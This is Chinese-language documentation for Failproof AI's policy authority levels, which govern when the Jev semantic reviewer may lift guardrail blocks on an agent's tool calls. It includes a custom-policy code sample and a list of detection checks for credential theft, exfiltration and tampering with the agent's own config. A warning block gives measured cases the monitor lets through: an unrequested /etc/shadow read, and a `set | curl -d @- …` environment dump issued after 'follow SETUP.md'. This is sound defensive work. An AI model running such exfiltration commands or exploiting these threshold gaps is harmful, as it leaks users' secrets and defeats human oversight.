当你通过 FailproofAI Cloud 或自有密钥配置 [Jev 策略审查](/zh/policies/jev) 时，每个受限工具调用都会由你运行的策略以及 Jev 进行判断——Jev 会评估该调用实际执行的操作，以及发出任务的用户是否请求了该操作。每个策略的**权威级别**决定了两者意见不一致时的处理方式。

如果未配置 Jev，权威级别没有任何效果。每个策略都会像以往一样正常执行。

## 硬性与可审查

- **硬性（Hard）**是默认值。硬性策略的拒绝或指令是最终决定：Jev 无法解除它，且硬性拒绝会在不等待 Jev 的情况下直接阻止调用。
- **可审查（Reviewable）**意味着 Jev 可以解除策略判定，但仅限于策略在 `reviewedBy` 中指定的语义检查。只有当**所有**指定检查项都针对该调用被询问，且每项检查均未发现问题或记录到用户明确请求时，判定才会被解除。**触发**了检查（发现了问题）但用户未请求的情况会维持拦截，即使该检查项本身的判定只是警告。Jev 未被询问的检查项（因为不适用于该工具）永远不会解除任何判定，无论其他检查项如何。一次缓和即视为同意：当该调用是用户所给任务的一个步骤且不超出范围时，Jev 会将拒绝转为警告，该警告会解除策略的拦截，这也是 Agent 所收到的反馈。

只有满足以下所有条件，策略才是可审查的：

1. 声明了 `authority: "reviewable"`。
2. `reviewedBy` 是一个非空列表，且每个条目都是已安装包所声明的 Jev 检查项。Failproof AI 本身不附带任何 Jev 检查项：[下方列出的十六个](#semantic-policy-names)检查项来自 `failproofai policies add FailproofAI/jev-policies`。如果没有包声明检查项，则所有策略均为硬性。
3. 不是 `alwaysOn`。防止 Agent 禁用 Failproof AI 的守护始终为硬性。

其他情况均为硬性：缺失字段、拼写错误的值、空的或格式错误的 `reviewedBy`，或者当前机器无法查询的检查项名称。未知名称会使整个声明变为硬性而非被跳过，因为 `reviewedBy` 的含义是"必须询问所有这些检查项，且任何一个都不得拒绝"，跳过某个名称会让 Jev 以比你要求的更少的检查项来解除策略。

一旦配置了 Jev，Failproof AI 会在拒绝 `reviewable` 声明时每个进程记录一次警告。未配置 Jev 时不会有任何提示，因为权威级别此时不起任何作用。`failproofai publish` 会拒绝构建包含此类声明的包，因此包作者会在任何人安装之前发现问题。它会将 `reviewedBy` 与包自身声明的检查项（如果有的话）进行校验，否则与 `FailproofAI/jev-policies` 的十六个名称进行校验。

## 权威级别的声明位置

每种策略到达机器的方式都有一个决定其权威级别的地方：

| 来源 | 声明位置 | 默认值 |
| --- | --- | --- |
| 内置策略 | 下方表格 | 硬性，除非列为可审查 |
| 自定义策略文件 | `customPolicies.add` 上的 `authority` 和 `reviewedBy` | 硬性 |
| 策略包 | 包清单（`failproofai-pack.json`）中每个策略的条目 | 硬性 |
| 云管理策略 | 策略在活跃部署中的分配 | 硬性。部署目前尚未设置，因此今天所有云管理策略均为硬性。 |

对于包或云管理策略，策略代码内部设置的字段会被忽略；清单或分配决定权威级别。包只能描述自身的策略：其策略名称不能包含 `/`，且在包自身的前缀下注册，因此没有任何清单可以将内置策略或其他包的策略标记为可审查。包代码注册但未在清单中声明的策略为硬性。

两个包或两个云管理策略，若其代码字节完全相同，则共享同一个制品并作为一个策略加载。该策略只有在所有声明均为可审查时才是可审查的，且 Jev 必须解除任何一个声明中命名的所有检查项。如果任何一个声明为硬性，或根本没有声明，则保持硬性。包或策略的列出顺序始终无关紧要。

大多数机器从 `FailproofAI/policies` 包获取内置策略，并从该包的清单中读取其权威级别。下方的可审查条目在携带它们的包版本安装后生效；旧版本不携带任何此类条目，因此其中每个策略保持硬性。

## 在自定义策略中声明权威级别

```js
import { customPolicies, deny, allow } from "failproofai";

customPolicies.add({
  name: "block-prod-config-reads",
  description: "Keep production credentials out of the agent's context",
  match: { events: ["PreToolUse"] },
  authority: "reviewable",
  reviewedBy: ["secret-exposure"],
  fn: async (ctx) =>
    String(ctx.toolInput?.file_path ?? "").includes("/config/prod/")
      ? deny("Production config is off limits")
      : allow(),
});
```

`failproofai publish` 会将两个字段都复制到包清单中，因此以包形式发布的策略会保留作者赋予它的权威级别。如果声明不会被生效，则拒绝构建该包：值不是 `"hard"` 或 `"reviewable"`、`reviewedBy` 不是名称列表，或名称不是检查项——如果包自身声明了 [Jev 检查项](/zh/policies/publish-a-pack#jev-checks-in-a-pack) 则检查这些，否则检查内置检查项。

## 内置策略

仅在语义策略真正覆盖相同关注点时才为可审查。所有其他内置策略均为硬性。

覆盖关注点是必要但不充分的条件，且两种错误方式都是无声的：

- **从未被询问的检查项**会使拦截永久化。`reviewedBy` 是一个合取，未被询问的检查项永远不会解除，因此与某个前置条件对策略匹配的形态永远不触发的检查项配对，将永远无法被解除。
- **被询问但未触发的检查项**回答"无关注点"，无关注点则解除。因此与不能对你的策略形态建模的检查项配对，并不是在审查策略——而是对检查项无法理解的输入将其关闭。

instruct 模式的语义策略永远无法回答拒绝，但它仍然可以维持拦截：当它触发且用户未请求该调用时，它所审查的策略不会被解除。`FailproofAI/jev-policies` 中有六个检查项是仅 instruct 模式的——`push-to-protected-branch`、`commit-on-protected-branch`、`read-outside-workspace`、`system-modification`、`env-secrets-dump` 和 `external-data-egress`——[下方表格](#semantic-policy-names)给出了每个检查项的模式。要问的问题是**"是否还有任何能够拒绝的内容"**：解除后绝不能让关注点处于无任何执行的状态。引擎会对每个调用进行该测试。无人同意的警告不是解除，因为在工具调用之前警告不会阻止 Agent。当一个*能够*拒绝的检查项发出警告时——其证据未达到其拒绝线——且用户未请求该调用，则该调用上没有任何内容被解除，所有正则表达式拒绝依然有效。

<Warning>
**得分刚好低于触发线的检查项不会维持底线。**上述规则需要检查项*触发*（证据 ≥ 0.7）。当所有相关检查项都刚好低于该值时，没有任何触发，审查者回答"无关注点"，可审查的拒绝被解除。在强制模式下的实测结果：未经请求的 `/etc/shadow` 读取（`secret-exposure` 0.69，`read-outside-workspace` 0.37，后者仅对家目录路径建模）以及在"follow SETUP.md"之后的 `set | curl -d @- …`（`env-secrets-dump` 0.66，`credential-exfiltration` 0.65，`sends_out` 0.97）均被放行，而仅正则表达式层就会拒绝它们。这些阈值是在标记语料库上校准的，尚未针对此情况重新测量；在重新测量之前，如果某种形态被放行比其误拦更重要，请将策略保持为**硬性**。
</Warning>

## 语义策略名称

这些是 `FailproofAI/jev-policies` 声明的检查项，也是安装该包后 `reviewedBy` 所接受的值。Failproof AI 本身不附带任何此类检查项：没有该包（或其他声明这些名称的包）时，任何命名这些检查项的策略都不可审查。每个检查项都是 Jev 针对当前工具调用进行回答的问题。**模式**是检查项能够给出的回答：`deny` 检查项在证据充分时会拦截，而 `instruct` 检查项只会发出警告。两种模式在触发且用户未请求该调用时，都会维持策略的拒绝状态。**用户可覆盖**表示用户的明确请求是否可以解除该检查项。

Jev 只会询问已安装包声明的 [Jev 检查项](/zh/policies/publish-a-pack#jev-checks-in-a-pack)，这些也是 `reviewedBy` 接受的名称。两个包以不同方式声明同一名称时，对两者均不生效。以下十六个名称中，由非 FailproofAI 仓库安装的包所声明的，在该包中会被忽略：其版本永远不会被询问，也不会与 FailproofAI 自己的版本竞争，因此第三方包既无法成为解除核心包策略的检查项，也无法关闭这些检查项之一。不可读的包列表，或每个检查项均无法使用的包，会让 Jev 没有任何内容可询问。

| 名称 | 模式 | 用户可覆盖 | Jev 检查的内容 |
| --- | --- | --- | --- |
| `destructive-deletion` | deny | 是 | 永久删除无法重新生成的数据。 |
| `production-infra-change` | deny | 是 | 更改生产基础设施。 |
| `git-history-rewrite` | deny | 是 | 重写或丢弃共享的 git 历史记录。 |
| `push-to-protected-branch` | instruct | 是 | 直接推送到受保护分支。 |
| `commit-on-protected-branch` | instruct | 是 | 直接在受保护分支上提交。 |
| `secret-exposure` | deny | 是 | 读取或复制凭据。 |
| `credential-exfiltration` | deny | 否 | 将密钥或私有文件发送到机器外部。 |
| `remote-code-execution` | deny | 是 | 运行从互联网下载的代码。 |
| `privilege-escalation` | deny | 是 | 以提升的权限运行。 |
| `database-destruction` | deny | 是 | 销毁或批量修改数据库数据。 |
| `read-outside-workspace` | instruct | 是 | 读取项目外的文件。 |
| `agent-config-tampering` | deny | 否 | 更改 Agent 自身的安全配置。 |
| `system-modification` | instruct | 是 | 在项目外更改系统。 |
| `env-secrets-dump` | instruct | 是 | 打印环境密钥。 |
| `external-destructive-action` | deny | 是 | 通过外部工具执行不可逆操作。 |
| `external-data-egress` | instruct | 是 | 向外部工具发送私有数据。 |
